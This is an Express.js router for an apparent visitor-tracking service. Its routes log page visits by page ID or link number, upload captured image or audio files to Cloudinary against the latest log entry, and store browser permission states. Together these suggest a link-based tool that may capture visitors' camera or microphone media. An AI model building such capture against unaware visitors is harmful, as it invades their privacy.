const express = require('express');
const trackingController = require('../controllers/trackingController');
const multerModule = require('../middleware/multer');
const upload = multerModule;
const handleMulterError = multerModule.handleMulterError;

const router = express.Router();

/**
 * Track Visit - GET /page/:pageId
 * Main tracking endpoint - captures visitor data and saves to MongoDB
 */
router.get('/page/:pageId', trackingController.trackVisit);

/**
 * Track Visit by Number - GET /:number
 * Alternative endpoint using number instead of pageId
 */
router.get('/:number', async (req, res, next) => {
  try {
    const Link = require('../models/link');
    const { number } = req.params;
    const numValue = parseInt(number, 10);
    
    if (isNaN(numValue)) {
      // If not a number, treat as pageId and redirect to trackVisit
      req.params.pageId = number;
      return trackingController.trackVisit(req, res, next);
    }

    // Find link by number
    const link = await Link.findOne({ number: numValue });
    if (!link) {
      return res.status(404).json({
        success: false,
        message: 'Link not found'
      });
    }

    // Redirect to pageId-based tracking
    req.params.pageId = link.pageId;
    return trackingController.trackVisit(req, res, next);
  } catch (error) {
    next(error);
  }
});

/**
 * Capture Media - POST /api/capture/:pageId
 * Upload image/audio file to Cloudinary and attach to latest log entry
 */
router.post(
  '/api/capture/:pageId',
  upload.single('file'),
  handleMulterError,
  trackingController.captureMedia
);

/**
 * Save Permissions - POST /api/permissions/:pageId
 * Save permission states to latest log entry
 */
router.post('/api/permissions/:pageId', trackingController.savePermissions);

module.exports = router;
